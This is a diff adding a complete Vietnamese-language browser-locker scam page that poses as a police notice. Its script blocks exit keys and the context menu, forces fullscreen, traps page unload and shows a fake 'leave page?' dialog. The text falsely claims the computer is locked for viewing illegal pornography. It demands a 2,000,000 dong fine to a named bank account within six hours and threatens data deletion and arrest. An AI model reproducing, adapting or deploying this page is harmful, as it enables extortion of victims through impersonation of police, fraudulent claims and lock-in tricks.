@@ -1,0 +1,237 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<html lang="vi">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="content-language" content="vi">
+<meta property="og:locale" content="vi_VN" />
+
+<script>
+window.onkeydown = function (evt) {
+    if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 46) {
+        return false
+    }
+};
+window.onkeypress = function (evn) {
+    if (evn.keyCode == 123 || evn.keyCode == 117) return false
+};
+
+function viewdiv(id){var el=document.getElementById(id);el.style.display="block";}
+
+onbeforeunload = function () {
+    alert("Нажмите ESC, чтобы закрыть страницу!");
+    return "Нажмите ESC, чтобы закрыть страницу!";}
+	
+var stroka = "";
+
+function toggleFullScreen() { 
+    if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen()
+        } else if (document.documentElement.mozRequestFullScreen) {
+            document.documentElement.mozRequestFullScreen()
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
+        }
+    }
+}
+
+
+
+document.addEventListener('keyup', function (e) {
+    if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13 || e.keyCode == 27 ) {
+        toggleFullScreen();
+        document.getElementById('map').innerHTML = stroka;
+        viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed'
+    }
+}, false);
+
+var pr = 1;
+window.onload = function() {
+    document.onclick = function(e) {
+        e = e || event;
+        target = e.target || e.srcElement;
+        toggleFullScreen();
+        //if (pr <= 1) {
+        //    document.getElementById('ots').innerHTML = "<img width='1' height='1' style='display:none' src='http://main.exoclick.com/tag.php?goal=a78c836f46380861ba27993336cc01e3'>";
+        //    pr++;
+        //}
+            document.getElementById('map').innerHTML = stroka;
+            viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed';
+        
+         var i = 0;
+         setTimeout(function() { 
+         while (i < 30000) {
+//         alert ("Статус: Ожидается оплата штрафа ...");
+//toggleFullScreen();		
+//         alert ("Статус: Проверка оплаты штрафа ...");
+         i++;
+         }
+         }, 1000);
+         
+    }
+}	
+
+
+document.oncontextmenu=new Function("return false");
+
+
+</script>
+
+
+
+
+
+
+
+<style>
+html,body{margin:0;padding:0;height:100%;width:100%;-moz-user-select:-moz-none;-o-user-select:none;-khtml-user-select:none;-webkit-user-select:none;user-select:none;background:#ffffff}table{font-size:16px;color:#000000;font-family:'PT Sans', 'Arial', 'Helvetica', sans-serif}.txt{font-size:15px}.blok{font-size:14px}
+
+
+img.rightoftable{
+    display: inline-block;
+}
+
+table.table1{
+    display: inline-table;
+}
+
+
+
+</style>
+</head>
+<body>
+<table width="100%" height="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tr>
+<td height="61" align="center" valign="top"><div id="map"></div><div id="ots"></div>
+</td></tr>
+<tr>
+<td align="center" valign="top"><br><br>
+<div id="mydiv" style="display:none;">
+<table width="100%" height="594" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tr><td width="30%" valign="top">
+</td>
+<td width="833">
+<table width="833" height="552" cellpadding="0" cellspacing="0" border="0" bgcolor="#390000">
+<tr>
+<td valign="top">
+ <table width="800" height="400" cellpadding="5" cellspacing="0" border="0" bgcolor="#ff0000">
+ <tr>
+ <td>
+   <table width="800" height="400" cellpadding="10" cellspacing="0" border="0" bgcolor="#fbfbfb">
+   <tr>
+   <td colspan="3" height="97" valign="top">
+      <table border="0" width="100%"><tr><td>
+         <img src="https://i.imgur.com/m29PHvr.jpg" width="180" height="150" border="0">
+      </td><td align="right">
+         <table width="300" height="100" cellpadding="5" cellspacing="1" border="0" bgcolor="#a2a2a2">
+         <tr>
+         <td bgcolor="#d5d5d5"><font color="#000000" size="2">
+         Họ tên của bạn: <font color="#008400">Đã xác định.</font><br>
+         Nơi ở của bạn: <font color="#008400">Đã xác định.</font><br>
+         Vị trí hiện tại của bạn:  <font color="#008400">Đã xác định.</font><br>
+         Hoạt động của Windows:  <font color="#bc0000">Đã bị khóa.</font><br>
+        Tất cả các tệp tin trên máy tính:  <font color="#bc0000">Đã bị khóa.</font><br>Tài khoản để thanh toán tiền phạt: 
+  <font color="#bc0000"><b>1024765051</b></font>
+        <br>
+         </td>
+         </tr>
+         </table>
+      </td></tr></table>
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="middle" width="150">
+      <table width="180"  cellpadding="0" cellspacing="5" height="60" borfer="0" bgcolor="#970000">
+      <tr>
+      <td align="center" bgcolor="#f2f2f2">
+      <b><p style="color: #6e0000">MÁY TÍNH CỦA BẠN <br>ĐÃ BỊ KHÓA!</p></b>
+      </td>
+      </tr>
+      </table>
+   </td>
+   <td align="left" valign="top" height="80">
+   <br><b>Quyết định phạt số 178-319 
+10.12.2021
+   <br><font color="#970000">Bạn bị phạt 2.000.000 đồng!</b></font>
+   </td>
+   <td align="center" valign="middle">
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="top" colspan="3">
+      <table width="800">
+      <tr>
+      <td align="left" valign="top" class="txt">
+      <font color="#171717">&nbsp;&nbsp;Bạn bị khóa vì nhiều lần truy cập vào các trang web khiêu dâm có chứa các nội dung bị pháp luật Việt Nam cấm, cụ thể là những nội dung khiêu dâm có yếu tố ấu dâm, bạo lực và truyền bá đồng tính.
+Bạn cần phải nộp phạt theo quyết định số 178-319 (10.12.2021) với số tiền <b>2.000.000</b> đồng vào tài khoản thu tiền phạt của cơ quan công an Việt Nam.
+
+<br>
+ <br>
+Bạn có thể nộp tiền phạt bằng bất kỳ phương thức thuận tiện nào. 
+
+</table>  <br>
+   
+ <table width="280"  cellpadding="0" cellspacing="5" height="60" borfer="0" bgcolor="#970000" class="table1">
+      <tr>
+      <td align="center" bgcolor="#f2f2f2">
+<b>H MAN NIE</b><br><b><font color="#970000"> 1024765051</font></b><br>
+<b><font color="#970000"> PHU NHUAN-PGD BEN NGHE</font></b>
+<br>
+
+     
+
+
+
+
+  <img src="https://iili.io/oRo7bj.md.png" width="400" height="150" border="0">
+
+
+ </td>
+      </tr>
+ </table>
+<img src="https://iili.io/7GsR8x.jpg" width="210" height="210" border="0" class="rightoftable">
+
+
+
+ <br>
+
+
+
+.<font color="#003205"><br>&nbsp;&nbsp;<b>Sau khi nộp phạt, máy tính của bạn sẽ tự động được mở khóa!
+</b></font><br>
+      <font color="#970000">&nbsp;&nbsp;<b>Điều quan trọng cần biết! </b> Trong trường hợp từ chối trả tiền phạt hoặc cố gắng tự mở khóa mà không trả tiền phạt, toàn bộ thông tin trên máy tính của bạn sẽ bị xóa mà không thể phục hồi nhằm ngăn chặn việc phát tán các nội dung khiêu dâm.
+Cảnh sát ngay lập tức sẽ được điều động đến nơi bạn cư trú để bắt giữ bạn. Một vụ án hình sự sẽ được khởi tố chống lại bạn do đã thực hiện các hành vi tội phạm.
+Thời hạn để nộp phạt là 6 giờ kể từ thời điểm thông báo và khóa.
+</font>
+      </td>
+      </tr>
+      
+      
+   </td>
+   </tr>
+   </table>
+ </td>
+ </tr>
+ </table>
+</td>
+</tr>
+</table>
+</td>
+<td width="30%"></td></tr>
+</table>
+</div>
+</td>
+<tr>
+<td></td></tr>
+<tr><td valign="bottom">
+</td></tr></table>
+<script type="text/javascript">
+document.getElementById('map').innerHTML = "<div style='top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)'><div style='float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;'>&times;</div><div style='font: 14px Verdana, Arial;text-align:left !important;margin-bottom:4px'>Rời khỏi trang này?</div><br><div style='font:10.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0'>Các thay đổi đã thực hiện có thể không được lưu.</div><br><div style='float:right;margin-top:10px'><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>Đóng</button><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>Ở lại</button></div></div>";
+</script>
+
+</body>
+</html>
